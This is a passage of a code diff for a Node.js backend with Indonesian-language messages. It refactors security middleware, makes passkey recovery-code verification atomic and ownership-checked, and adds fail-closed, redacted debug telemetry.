         if (method === 'OPTIONS' || diracV143NeverTouchAction(action)) {
-          return __diracV143PreviousHandler(req, res);
+          return nextHandlerV202(req, res);
         }
 
         const existing = await diracV143CheckActiveGlobalBan(req).catch(() => ({ blocked: false }));
@@ -23997,9 +28492,9 @@ try {
         return diracV143BlockedResponse(res, 'GLOBAL_API_GUARD_ERROR');
       }
 
-      return __diracV143PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracV143Wrapped', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracGlobalApiThreatGuardWrapperV143");
+    __diracV202MarkWrapperFlag("__diracV143Wrapped");
   }
 } catch (_) {}
 
@@ -24556,9 +29051,7 @@ function diracV143EnvTrue(name) {
 }
 
 function diracV143SafeError(error) {
-  const message = String(error && (error.code || error.name || error.message) || error || 'security_error');
-  if (/password|token|secret|cookie|authorization|service_role|apikey|csrf|hmac|hash/i.test(message)) return 'global_api_guard_internal_error';
-  return message.slice(0, 160);
+  return diracSecurityRedactDiagnosticV210(error || 'global_api_guard_internal_error', 160);
 }
 
 /* ============================================================
@@ -24788,6 +29281,19 @@ try {
   const __diracV145OriginalInspectOwnership = typeof diracV143InspectOwnership === 'function' ? diracV143InspectOwnership : null;
   if (__diracV145OriginalInspectOwnership && !__diracV145OriginalInspectOwnership.__diracV145Wrapped) {
     diracV143InspectOwnership = async function diracV143InspectOwnershipSensitiveIdsOnlyV145(req, body) {
+      const centralAction = typeof diracV143NormalizeAction === 'function'
+        ? diracV143NormalizeAction((req && req.query && req.query.action) || (body && (body.action || body.mode)) || '')
+        : String(req && req.query && req.query.action || '').trim().toLowerCase();
+
+      // CHECKOUT CENTRAL-GUARD NARROW FIX v160:
+      // Central Guard sudah menjalankan contract, threat, IDOR/BOLA, MFA, CSRF,
+      // page nonce, device, rate, circuit, dan integrity sebelum handler lama.
+      // Lewati hanya ownership lookup legacy v143 untuk checkout_order yang sudah
+      // memiliki passport Central Guard agar lookup orders/domain/payment tidak diulang.
+      if (req && req.__diracCentralSecurityGuardPassedV146 === true && centralAction === 'checkout_order') {
+        return { ok: true, skipped: 'checkout_order_already_guarded_by_central_v146' };
+      }
+
       if (diracV145EnvTrue('DIRAC_V143_OWNERSHIP_ALL_IDS')) {
         return __diracV145OriginalInspectOwnership(req, body);
       }
@@ -24920,16 +29426,16 @@ async function customerSecurityVerifyRecoveryCodeLocalWorker(req, res, action, o
     await customerSecurityRegisterFailedVerification(req, action, 'invalid_recovery_worker_verify_payload', access && access.customerId).catch(() => null);
     return res.status(400).json({ ok: false, message: 'Request recovery tidak valid.' });
   }
-  if (Array.from(code).length !== CUSTOMER_SECURITY_RECOVERY_CODE_LENGTH) {
+  if (Array.from(code).length !== LOST_PASSKEY_RECOVERY_CODE_LENGTH_V157) {
     await customerSecurityRegisterFailedVerification(req, action, 'invalid_recovery_code_length', access.customerId).catch(() => null);
     return res.status(400).json({
       ok: false,
-      message: 'Recovery code tidak valid. Masukkan tepat 500 karakter dari file recovery terenkripsi.'
+      message: 'Recovery code tidak valid. Masukkan tepat ' + LOST_PASSKEY_RECOVERY_CODE_LENGTH_V157 + ' karakter dari file recovery terenkripsi.'
     });
   }
 
   const path = '/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE + '?select=' +
-    encodeURIComponent('id,request_id,customer_id,auth_user_id,email_hash,customer_binding_hash,auth_user_binding_hash,device_binding_hash,recovery_code_hash,status,attempt_count,expires_at,used_at,revoked_at,locked_at,old_passkey_ids') +
+    encodeURIComponent('id,request_id,customer_id,auth_user_id,email_hash,customer_binding_hash,auth_user_binding_hash,device_binding_hash,recovery_code_hash,status,attempt_count,expires_at,used_at,revoked_at,locked_at,old_passkey_ids,metadata') +
     '&request_id=eq.' + encodeURIComponent(requestId) +
     '&limit=1';
 
@@ -24945,28 +29451,15 @@ async function customerSecurityVerifyRecoveryCodeLocalWorker(req, res, action, o
   }
 
   const nowMs = Date.now();
-  if (row.status !== 'pending' || row.used_at || row.revoked_at || row.locked_at || new Date(row.expires_at).getTime() <= nowMs) {
+  const expiresAtMs = Date.parse(String(row.expires_at || ''));
+  if (row.status !== 'pending' || row.used_at || row.revoked_at || row.locked_at
+    || !Number.isFinite(expiresAtMs) || expiresAtMs <= nowMs) {
     return customerSecuritySendRecoveryError(res, 403, row.status === 'used' || row.used_at ? 'used' : 'expired');
   }
 
-  const expectedHash = customerSecurityLostPasskeyRecoveryCodeHash(requestId, row.customer_id, code);
-  if (!safeEqual(String(row.recovery_code_hash || ''), expectedHash)) {
-    const nextAttempts = Number(row.attempt_count || 0) + 1;
-    const lock = nextAttempts >= LOST_PASSKEY_RECOVERY_ATTEMPT_LIMIT;
-    await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE + '?request_id=eq.' + encodeURIComponent(requestId), {
-      method: 'PATCH',
-      auth: 'service',
-      body: {
-        attempt_count: nextAttempts,
-        status: lock ? 'locked' : row.status,
-        locked_at: lock ? diracNowIso() : row.locked_at || null,
-        metadata: { last_failed_verify_at: diracNowIso(), failed_verify_source: action }
-      }
-    }).catch(() => null);
-    await customerSecurityRegisterFailedVerification(req, action, lock ? 'recovery_code_locked' : 'recovery_code_not_matched', access.customerId).catch(() => null);
-    return res.status(lock ? 423 : 403).json({ ok: false, message: lock ? 'Recovery request dikunci karena terlalu banyak percobaan.' : 'Recovery code salah, sudah dipakai, atau sudah expired.' });
-  }
-
+  // Ownership and account bindings must be proven before any attempt counter
+  // or request state can be changed. This prevents cross-account lockout by a
+  // caller who knows another request_id.
   if (String(owner.customerId) !== String(row.customer_id) || String(owner.authUserId) !== String(row.auth_user_id)) {
     await customerSecurityRegisterFailedVerification(req, action, 'recovery_owner_mismatch', access.customerId).catch(() => null);
     return res.status(403).json({ ok: false, message: 'Recovery request tidak cocok dengan sesi login ini.' });
@@ -24978,51 +29471,111 @@ async function customerSecurityVerifyRecoveryCodeLocalWorker(req, res, action, o
     return res.status(403).json({ ok: false, message: 'Recovery binding tidak cocok dengan akun login.' });
   }
 
+  const expectedHash = customerSecurityLostPasskeyRecoveryCodeHash(requestId, row.customer_id, code);
+  if (!safeEqual(String(row.recovery_code_hash || ''), expectedHash)) {
+    const currentAttempts = Math.max(0, Math.floor(Number(row.attempt_count || 0)));
+    const nextAttempts = currentAttempts + 1;
+    const lock = nextAttempts >= LOST_PASSKEY_RECOVERY_ATTEMPT_LIMIT;
+    const previousMetadata = row.metadata && typeof row.metadata === 'object' && !Array.isArray(row.metadata) ? row.metadata : {};
+    const attemptPatched = await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE
+      + '?request_id=eq.' + encodeURIComponent(requestId)
+      + '&customer_id=eq.' + encodeURIComponent(owner.customerId)
+      + '&auth_user_id=eq.' + encodeURIComponent(owner.authUserId)
+      + '&status=eq.pending'
+      + '&attempt_count=eq.' + encodeURIComponent(String(currentAttempts))
+      + '&expires_at=gt.' + encodeURIComponent(new Date(nowMs).toISOString())
+      + '&used_at=is.null&revoked_at=is.null&locked_at=is.null', {
+      method: 'PATCH',
+      auth: 'service',
+      prefer: 'return=representation',
+      body: {
+        attempt_count: nextAttempts,
+        status: lock ? 'locked' : 'pending',
+        locked_at: lock ? diracNowIso() : null,
+        metadata: { ...previousMetadata, last_failed_verify_at: diracNowIso(), failed_verify_source: action }
+      }
+    }).catch(() => null);
+    if (!attemptPatched || !attemptPatched.ok || !Array.isArray(attemptPatched.data) || attemptPatched.data.length !== 1) {
+      return res.status(409).json({ ok: false, message: 'Status recovery berubah. Muat ulang lalu coba lagi.' });
+    }
+    await customerSecurityRegisterFailedVerification(req, action, lock ? 'recovery_code_locked' : 'recovery_code_not_matched', access.customerId).catch(() => null);
+    return res.status(lock ? 423 : 403).json({ ok: false, message: lock ? 'Recovery request dikunci karena terlalu banyak percobaan.' : 'Recovery code salah, sudah dipakai, atau sudah expired.' });
+  }
+
   const activePasskeys = await customerSecurityLostPasskeyActivePasskeys(owner);
   if (!activePasskeys.length) {
     return res.status(409).json({ ok: false, message: 'Passkey lama tidak ditemukan untuk akun ini.' });
   }
 
   const now = diracNowIso();
-  const recoverySessionToken = crypto.randomBytes(32).toString('base64url');
-  const recoverySessionHash = customerSecurityLostPasskeyRecoverySessionHash(recoverySessionToken);
-  const sessionExpiresAt = new Date(Date.now() + Math.max(5, Math.min(30, Number(process.env.DIRAC_LOST_PASSKEY_SESSION_MINUTES || 10))) * 60 * 1000).toISOString();
-  const sessionCreated = await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_SESSION_TABLE, {
-    method: 'POST',
-    auth: 'service',
-    prefer: 'return=representation',
-    body: [{
-      request_id: requestId,
-      customer_id: owner.customerId,
-      auth_user_id: owner.authUserId,
-      recovery_session_hash: recoverySessionHash,
-      purpose: LOST_PASSKEY_RECOVERY_PURPOSE,
-      status: 'verified',
-      created_at: now,
-      expires_at: sessionExpiresAt,
-      metadata: { source: action, old_passkey_count: activePasskeys.length }
-    }]
-  });
-  if (!sessionCreated.ok) {
-    return res.status(sessionCreated.status || 500).json({ ok: false, message: 'Gagal membuat recovery session.' });
-  }
-
-  const patched = await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE + '?request_id=eq.' + encodeURIComponent(requestId), {
+  const previousMetadata = row.metadata && typeof row.metadata === 'object' && !Array.isArray(row.metadata) ? row.metadata : {};
+  const verificationMetadata = {
+    ...previousMetadata,
+    source: 'lost_passkey_recovery_code_verify',
+    verified_by_endpoint: action,
+    verified_at: now,
+    owner_bound: true,
+    atomic_claim: true
+  };
+  const requestClaimed = await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE
+    + '?request_id=eq.' + encodeURIComponent(requestId)
+    + '&customer_id=eq.' + encodeURIComponent(owner.customerId)
+    + '&auth_user_id=eq.' + encodeURIComponent(owner.authUserId)
+    + '&status=eq.pending'
+    + '&attempt_count=eq.' + encodeURIComponent(String(Math.max(0, Math.floor(Number(row.attempt_count || 0)))))
+    + '&expires_at=gt.' + encodeURIComponent(new Date(nowMs).toISOString())
+    + '&used_at=is.null&revoked_at=is.null&locked_at=is.null', {
     method: 'PATCH',
     auth: 'service',
     prefer: 'return=representation',
     body: {
       status: 'verified',
-      metadata: {
-        source: 'lost_passkey_recovery_code_verify',
-        verified_by_endpoint: action,
-        verified_at: now
-      }
+      metadata: verificationMetadata
     }
   });
+  if (!requestClaimed.ok || !Array.isArray(requestClaimed.data) || requestClaimed.data.length !== 1) {
+    return res.status(409).json({ ok: false, code: 'RECOVERY_REQUEST_COMMIT_CONFLICT', message: 'Recovery request sudah diproses atau statusnya berubah.' });
+  }
 
-  if (!patched.ok) {
-    return res.status(500).json({ ok: false, message: 'Gagal menandai recovery request sebagai verified.' });
+  let recoverySessionToken = '';
+  let sessionExpiresAt = '';
+  let sessionCreated = null;
+  try {
+    recoverySessionToken = crypto.randomBytes(32).toString('base64url');
+    const recoverySessionHash = customerSecurityLostPasskeyRecoverySessionHash(recoverySessionToken);
+    sessionExpiresAt = new Date(Date.now() + Math.max(5, Math.min(30, Number(process.env.DIRAC_LOST_PASSKEY_SESSION_MINUTES || 10))) * 60 * 1000).toISOString();
+    sessionCreated = await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_SESSION_TABLE, {
+      method: 'POST',
+      auth: 'service',
+      prefer: 'return=representation',
+      body: [{
+        request_id: requestId,
+        customer_id: owner.customerId,
+        auth_user_id: owner.authUserId,
+        recovery_session_hash: recoverySessionHash,
+        purpose: LOST_PASSKEY_RECOVERY_PURPOSE,
+        status: 'verified',
+        created_at: now,
+        expires_at: sessionExpiresAt,
+        metadata: { source: action, old_passkey_count: activePasskeys.length, owner_bound: true, atomic_claim: true }
+      }]
+    });
+  } catch (_) {
+    sessionCreated = null;
+  }
+
+  if (!sessionCreated || !sessionCreated.ok || !Array.isArray(sessionCreated.data) || sessionCreated.data.length !== 1) {
+    await supabaseFetch('/rest/v1/' + LOST_PASSKEY_RECOVERY_REQUEST_TABLE
+      + '?request_id=eq.' + encodeURIComponent(requestId)
+      + '&customer_id=eq.' + encodeURIComponent(owner.customerId)
+      + '&auth_user_id=eq.' + encodeURIComponent(owner.authUserId)
+      + '&status=eq.verified', {
+      method: 'PATCH',
+      auth: 'service',
+      prefer: 'return=minimal',
+      body: { status: 'pending', metadata: previousMetadata }
+    }).catch(() => null);
+    return res.status(sessionCreated && sessionCreated.status || 500).json({ ok: false, message: 'Gagal membuat recovery session.' });
   }
 
   await customerSecurityWriteGuardEvent(access.customerId, {
@@ -25032,7 +29585,7 @@ async function customerSecurityVerifyRecoveryCodeLocalWorker(req, res, action, o
     description: 'Customer memverifikasi recovery code terenkripsi untuk pemulihan Passkey.',
     req,
     metadata: { action, request_id: requestId }
-  });
+  }).catch(() => null);
 
   return res.status(200).json({
     ok: true,
@@ -25097,8 +29650,8 @@ async function customerSecurityHandleRecoveryWorkerGenerate(req, res, action) {
   return res.status(404).json({ ok: false, code: 'RECOVERY_WORKER_TASK_INVALID', message: 'Worker task recovery tidak valid.' });
 }
 
-const __diracRecoveryWorkerPreviousHandler = module.exports;
-module.exports = async function diracRecoveryWorkerWrapper(req, res) {
+const __diracRecoveryWorkerPreviousHandler = __diracV202DispatcherSentinel;
+__diracV202RegisterMiddleware(async function diracRecoveryWorkerWrapper(req, res, nextHandlerV202) {
   const rawAction = String(req && req.query && req.query.action || '').trim().toLowerCase();
   const action = rawAction === DIRAC_RECOVERY_WORKER_ACTION ? DIRAC_RECOVERY_WORKER_ACTION : rawAction;
   if (action === DIRAC_RECOVERY_WORKER_ACTION) {
@@ -25107,8 +29660,8 @@ module.exports = async function diracRecoveryWorkerWrapper(req, res) {
   if (customerSecurityRecoveryWorkerLocalEnabled()) {
     return res.status(404).json({ ok: false, code: 'RECOVERY_WORKER_ONLY', message: 'Endpoint worker hanya menerima action internal recovery.' });
   }
-  return __diracRecoveryWorkerPreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracRecoveryWorkerWrapper");
 
 /* ============================================================
    DIRAC CENTRAL SECURITY GUARD v146 - FINAL CENTRAL FLOW
@@ -25136,8 +29689,16 @@ const DIRAC_CENTRAL_ASYNC_CONTEXT_V149 = globalThis.__DIRAC_CENTRAL_ASYNC_CONTEX
     return null;
   }
 })();
+const DIRAC_CENTRAL_DATABASE_EGRESS_CONTEXT_V230 = (() => {
+  try {
+    const { AsyncLocalStorage } = require('async_hooks');
+    return new AsyncLocalStorage();
+  } catch (_) {
+    return null;
+  }
+})();
 const DIRAC_CENTRAL_SECRET_CACHE_V146 = globalThis.__DIRAC_CENTRAL_SECRET_CACHE_V146__ || new Map();
-const DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148 = globalThis.__DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148__ || new Map();
+const DIRAC_CENTRAL_HARDENING_V228 = 'dirac-central-owasp-hardening-v228';
 globalThis.__DIRAC_CENTRAL_MEMORY_BAN_V146__ = DIRAC_CENTRAL_MEMORY_BAN_V146;
 globalThis.__DIRAC_CENTRAL_NEGATIVE_BAN_V146__ = DIRAC_CENTRAL_NEGATIVE_BAN_V146;
 globalThis.__DIRAC_CENTRAL_DEVICE_BINDINGS_V146__ = DIRAC_CENTRAL_DEVICE_BINDINGS_V146;
@@ -25147,7 +29708,3130 @@ globalThis.__DIRAC_CENTRAL_DNS_CACHE_V146__ = DIRAC_CENTRAL_DNS_CACHE_V146;
 globalThis.__DIRAC_CENTRAL_CONTEXT_STACK_V146__ = DIRAC_CENTRAL_CONTEXT_STACK_V146;
 globalThis.__DIRAC_CENTRAL_ASYNC_CONTEXT_V149__ = DIRAC_CENTRAL_ASYNC_CONTEXT_V149;
 globalThis.__DIRAC_CENTRAL_SECRET_CACHE_V146__ = DIRAC_CENTRAL_SECRET_CACHE_V146;
-globalThis.__DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148__ = DIRAC_CENTRAL_A2F_SIGNATURE_NONCES_V148;
+if (diracCentralIsProductionV146() && !DIRAC_CENTRAL_ASYNC_CONTEXT_V149) {
+  throw new Error('DIRAC_ASYNC_LOCAL_STORAGE_REQUIRED_V228');
+}
+
+/* ============================================================
+   DIRAC CENTRAL FAIL-CLOSED + SAFE DEBUG v211
+   Narrow scope only:
+   - no endpoint, handler, login, hash, Argon2id, payment, email, A2F/MFA change;
+   - every security decision fails closed when context/storage/guard is unavailable;
+   - debug remains redacted and never exposes secrets to normal production users.
+   ============================================================ */
+function diracCentralRecordSuppressedExceptionV221(error) {
+  try {
+    const store = globalThis.__DIRAC_CENTRAL_SUPPRESSED_EXCEPTIONS_V221__
+      || (globalThis.__DIRAC_CENTRAL_SUPPRESSED_EXCEPTIONS_V221__ = new Map());
+    const name = String(error && error.name || 'Error').slice(0, 80);
+    const code = String(error && error.code || 'UNCLASSIFIED').slice(0, 120);
+    const key = crypto.createHash('sha256').update(name + '|' + code).digest('hex').slice(0, 32);
+    const previous = store.get(key) || { count: 0, firstSeenMs: Date.now(), lastSeenMs: 0, name, code };
+    previous.count = Number(previous.count || 0) + 1;
+    previous.lastSeenMs = Date.now();
+    store.set(key, previous);
+    const powerOfTwo = previous.count > 0 && (previous.count & (previous.count - 1)) === 0;
+    if (previous.count === 1 || powerOfTwo) {
+      try {
+        console.error('[dirac-central-security-telemetry]', JSON.stringify({
+          event: 'suppressed_exception',
+          error_key: key,
+          name,
+          code,
+          count: previous.count,
+          first_seen_ms: previous.firstSeenMs,
+          last_seen_ms: previous.lastSeenMs,
+          patch: DIRAC_CENTRAL_HARDENING_V228
+        }));
+      } catch (telemetryOutputErrorV228) {
+        void telemetryOutputErrorV228;
+      }
+      if (globalThis.__DIRAC_V230_RUNTIME_READY__ === true) {
+        void diracCentralSecurityTelemetryV230({
+          event_type: 'suppressed_exception', severity: 'warning', reason_code: code,
+          event_json: { error_key: key, name, code, count: previous.count }
+        }).catch(() => false);
+      }
+    }
+    if (store.size > 512) {
+      const oldest = Array.from(store.entries()).sort((a, b) => Number(a[1] && a[1].lastSeenMs || 0) - Number(b[1] && b[1].lastSeenMs || 0));
+      for (const [entryKey] of oldest.slice(0, store.size - 384)) store.delete(entryKey);
+    }
+    return true;
+  } catch (telemetryErrorV221) {
+    void telemetryErrorV221;
+    return false;
+  }
+}
+
+const DIRAC_CENTRAL_FAIL_CLOSED_DEBUG_V211 = 'dirac-central-fail-closed-debug-v211';
+const DIRAC_CENTRAL_OWNER_DEBUG_V212 = 'dirac-central-owner-debug-v212';
+const DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215 = 'dirac-central-verified-owner-context-v215';
+const DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXTS_V215 = new WeakMap();
+const DIRAC_CENTRAL_VERIFIED_OWNER_ACTIONS_V217 = Object.freeze([
+  'domain_dashboard_me',
+  'domain_checkout',
+  'domain_orders',
+  'customer_security_status',
+  'customer_security_overview',
+  'customer_security_recovery_codes_status',
+  'customer_security_recovery_codes_generate',
+  'customer_security_recovery_code_verify',
+  'checkout_order',
+  'my_orders',
+  'customer_orders',
+  'pesanan_saya',
+  'my_invoices',
+  'invoice_saya',
+  'create_payment'
+]);
+
+function diracCentralVerifiedOwnerActionV217(action) {
+  return DIRAC_CENTRAL_VERIFIED_OWNER_ACTIONS_V217.includes(String(action || '').trim().toLowerCase());
+}
+
+function diracCentralOwnerFromStage26V217(ctx) {
+  const authUserId = String(ctx && (ctx.__diracCentralVerifiedOwnerAuthUserIdV217 || ctx.__diracCentralCheckoutOwnerAuthUserIdV196) || '').trim();
+  const customerId = String(ctx && (ctx.__diracCentralVerifiedOwnerCustomerIdV217 || ctx.__diracCentralCheckoutOwnerCustomerIdV196) || '').trim();
+  if (!diracCentralLooksLikeUuidV146(authUserId) || !diracCentralLooksLikeUuidV146(customerId)) return null;
+  return Object.freeze({
+    ok: true,
+    authUserId,
+    customerIds: Object.freeze([customerId]),
+    source: 'central_stage26_owner_binding_v217'
+  });
+}
+
+function diracCentralSealVerifiedOwnerContextV215(req, owner, source) {
+  const ctx = diracCentralCurrentContextV149();
+  if (!req || typeof req !== 'object' || !ctx || ctx.req !== req) {
+    return { ok: false, reason: 'request_context_missing' };
+  }
+  if (!diracCentralHandlerContextFullyPassedV211(ctx, req)) {
+    return { ok: false, reason: 'central_guard_not_fully_passed' };
+  }
+  if (!diracCentralVerifiedOwnerActionV217(ctx.action)) {
+    return { ok: false, reason: 'action_not_authorized' };
+  }
+
+  const authUserId = String(owner && owner.authUserId || '').trim();
+  const customerIds = Array.from(new Set((owner && Array.isArray(owner.customerIds) ? owner.customerIds : [])
+    .map((value) => String(value || '').trim())
+    .filter((value) => diracCentralLooksLikeUuidV146(value))));
+  if (!owner || owner.ok !== true || !diracCentralLooksLikeUuidV146(authUserId) || customerIds.length !== 1) {
+    return { ok: false, reason: 'verified_owner_invalid_or_ambiguous' };
+  }
+
+  let passportHex = '0';
+  try { passportHex = BigInt(ctx.passport || 0n).toString(16); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  const sealed = Object.freeze({
+    patch: DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215,
+    requestId: String(ctx.requestId || ''),
+    action: String(ctx.action || ''),
+    authUserId,
+    customerId: customerIds[0],
+    passportHex,
+    verifiedAtMs: Date.now(),
+    source: String(source || 'central_owner_resolver').replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 80)
+  });
+  DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXTS_V215.set(req, sealed);
+  ctx.verifiedOwnerContextDebugV215 = Object.freeze({
+    patch: DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215,
+    result: 'sealed',
+    source: sealed.source,
+    request_bound: true,
+    action_bound: true,
+    auth_user_bound: true,
+    customer_owner_count: 1
+  });
+  return { ok: true, context: sealed };
+}
+
+function diracCentralReadVerifiedOwnerContextV215(req, expectedAuthUserId) {
+  const ctx = diracCentralCurrentContextV149();
+  if (!req || typeof req !== 'object' || !ctx || ctx.req !== req) {
+    return { ok: false, reason: 'request_context_missing', failurePoint: 'verified_owner_context.request' };
+  }
+  if (!diracCentralHandlerContextFullyPassedV211(ctx, req)) {
+    return { ok: false, reason: 'central_guard_not_fully_passed', failurePoint: 'verified_owner_context.central_guard' };
+  }
+  const sealed = DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXTS_V215.get(req);
+  if (!sealed || sealed.patch !== DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215) {
+    return { ok: false, reason: 'verified_owner_context_missing', failurePoint: 'verified_owner_context.weakmap' };
+  }
+  if (sealed.requestId !== String(ctx.requestId || '')) {
+    return { ok: false, reason: 'verified_owner_request_id_mismatch', failurePoint: 'verified_owner_context.request_id' };
+  }
+  if (sealed.action !== String(ctx.action || '') || !diracCentralVerifiedOwnerActionV217(sealed.action)) {
+    return { ok: false, reason: 'verified_owner_action_mismatch', failurePoint: 'verified_owner_context.action' };
+  }
+  const expected = String(expectedAuthUserId || '').trim();
+  if (expected && (!diracCentralLooksLikeUuidV146(expected) || sealed.authUserId !== expected)) {
+    return { ok: false, reason: 'verified_owner_auth_user_mismatch', failurePoint: 'verified_owner_context.auth_user_id' };
+  }
+  if (!diracCentralLooksLikeUuidV146(sealed.customerId)) {
+    return { ok: false, reason: 'verified_owner_customer_id_invalid', failurePoint: 'verified_owner_context.customer_id' };
+  }
+  let currentPassportHex = '0';
+  try { currentPassportHex = BigInt(ctx.passport || 0n).toString(16); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+  if (!sealed.passportHex || sealed.passportHex !== currentPassportHex) {
+    return { ok: false, reason: 'verified_owner_passport_mismatch', failurePoint: 'verified_owner_context.passport' };
+  }
+  return { ok: true, context: sealed };
+}
+
+function diracCentralOwnerFromVerifiedContextV215(req, expectedAuthUserId) {
+  const verified = diracCentralReadVerifiedOwnerContextV215(req, expectedAuthUserId);
+  if (!verified || verified.ok !== true || !verified.context) return null;
+  return Object.freeze({
+    ok: true,
+    authUserId: verified.context.authUserId,
+    customerIds: Object.freeze([verified.context.customerId]),
+    source: DIRAC_CENTRAL_VERIFIED_OWNER_CONTEXT_PATCH_V215
+  });
+}
+
+function diracCentralSafeDiagnosticErrorV212(error) {
+  const name = String(error && error.name || 'Error').replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 80) || 'Error';
+  const code = String(error && error.code || '').replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 100);
+  const rawMessage = String(error && error.message || error || 'unknown_error');
+  return {
+    name,
+    code: code || undefined,
+    message: diracSecurityRedactDiagnosticV210(rawMessage, 220)
+  };
+}
+
+function diracCentralCommitOwnerDebugV212(ctx, debug, finalCode, failurePoint) {
+  if (!ctx || !debug || typeof debug !== 'object') return debug;
+  debug.patch = DIRAC_CENTRAL_OWNER_DEBUG_V212;
+  debug.final_code = String(finalCode || debug.final_code || 'OWNER_DEBUG_UNSPECIFIED').slice(0, 120);
+  debug.failure_point = String(failurePoint || debug.failure_point || '').slice(0, 180);
+  debug.elapsed_ms = Math.max(0, Date.now() - Number(debug.started_at_ms || Date.now()));
+  ctx.ownerResolutionDebugV212 = debug;
+  return debug;
+}
+
+function diracCentralSafeRestShapeV212(path, options, table, method) {
+  const raw = String(path || '');
+  const query = raw.includes('?') ? raw.slice(raw.indexOf('?') + 1) : '';
+  const queryKeys = Array.from(new Set(query.split('&').map((part) => {
+    const index = part.indexOf('=');
+    const encodedKey = (index >= 0 ? part.slice(0, index) : part) || '';
+    let decodedKey = encodedKey;
+    try { decodedKey = decodeURIComponent(encodedKey); } catch (suppressedErrorV221) { diracCentralRecordSuppressedExceptionV221(suppressedErrorV221); }
+    return String(decodedKey).replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 50);
+  }).filter(Boolean))).slice(0, 20);
+  const body = options && options.body;
+  const rows = Array.isArray(body) ? body : (body && typeof body === 'object' ? [body] : []);
+  const bodyKeys = Array.from(new Set(rows.flatMap((row) => row && typeof row === 'object' && !Array.isArray(row) ? Object.keys(row) : [])
+    .map((key) => String(key || '').replace(/[^a-zA-Z0-9_.-]/g, '').slice(0, 60)).filter(Boolean))).slice(0, 30);
+  return {
+    table: String(table || '').replace(/[^a-zA-Z0-9_]/g, '').slice(0, 80),
+    method: String(method || options && options.method || 'GET').toUpperCase().slice(0, 12),
+    query_keys: queryKeys,
+    body_kind: Array.isArray(body) ? 'array' : body && typeof body === 'object' ? 'object' : body == null ? 'none' : typeof body,
+    body_row_count: rows.length,
+    body_keys: bodyKeys
+  };
+}
+
+function diracCentralEmitServiceRoleBlockV212(ctx, reason, details) {
+  const prior = ctx && ctx.serviceRoleDebugV212 && typeof ctx.serviceRoleDebugV212 === 'object'
+    ? ctx.serviceRoleDebugV212
+    : {};
+  const diagnostic = {
+    ...prior,
+    ...(details && typeof details === 'object' ? details : {}),
+    patch: DIRAC_CENTRAL_OWNER_DEBUG_V212,
+    reason: String(reason || 'service_role_blocked').slice(0, 120),
+    diagnostic_code: String(details && details.diagnostic_code || prior.diagnostic_code || reason || 'SERVICE_ROLE_BLOCKED').slice(0, 160),
+    failure_point: String(details && details.failure_point || prior.failure_point || 'diracCentralInspectServiceRoleAccessV146').slice(0, 180)
+  };
+  if (ctx) ctx.serviceRoleDebugV212 = diagnostic;
+  return diracCentralEmitDebugV211(ctx, 'service_role_blocked', {
+    reason: diagnostic.reason,
+    diagnostic_code: diagnostic.diagnostic_code,
+    failure_point: diagnostic.failure_point,
+    service_role_debug: diagnostic,
+    owner_resolution_debug: ctx && ctx.ownerResolutionDebugV212 || undefined
+  });
+}
+
+function diracCentralDebugEnabledV211() {
+  return diracCentralEnvTrueV150('DIRAC_CENTRAL_DEBUG')
+    || diracCentralEnvTrueV150('DIRAC_CENTRAL_FAIL_CLOSED_DEBUG');
+}
+
+function diracCentralDebugResponseAllowedV211(ctx) {
+  if (!diracCentralDebugEnabledV211()) return false;
+  if (!diracCentralIsProductionV146()) return true;
+  try { return Boolean(ctx && ctx.req && isAdminRequest(ctx.req)); } catch (_) { return false; }
+}
+
+function diracCentralFailureIdV211(ctx) {
+  const requestId = String(ctx && ctx.requestId || '').replace(/[^a-f0-9]/gi, '').slice(0, 32);
+  return requestId ? 'DG-CENTRAL-' + requestId.slice(0, 16).toUpperCase() : 'DG-CENTRAL-UNAVAILABLE';
+}
+
+function diracCentralStageTraceV211(ctx, limit = 30) {
+  const trace = Array.isArray(ctx && ctx.stageTraceV211) ? ctx.stageTraceV211 : [];
+  return trace.slice(-Math.max(1, Math.min(30, Number(limit || 30)))).map((entry) => ({
+    index: Number(entry && entry.index || 0),
+    stage: String(entry && entry.stage || '').slice(0, 80),
+    result: String(entry && entry.result || '').slice(0, 40),
+    duration_ms: Number(entry && entry.duration_ms || 0)
+  }));
+}
+
+function diracCentralEmitDebugV211(ctx, event, extra) {
+  const payload = {
+    patch: DIRAC_CENTRAL_FAIL_CLOSED_DEBUG_V211,
+    event: String(event || 'central_event').slice(0, 80),
+    request_id: String(ctx && ctx.requestId || '').slice(0, 64),
+    failure_id: diracCentralFailureIdV211(ctx),
+    action: String(ctx && ctx.action || ctx && ctx.rawAction || '').slice(0, 80),
+    method: String(ctx && ctx.method || '').slice(0, 12),
+    phase: String(ctx && ctx.executionPhaseV211 || '').slice(0, 30),
+    stage_index: Number((ctx && ctx.currentStageIndexV211) ?? -1),
+    stage: String(ctx && ctx.currentStageV211 || '').slice(0, 80),
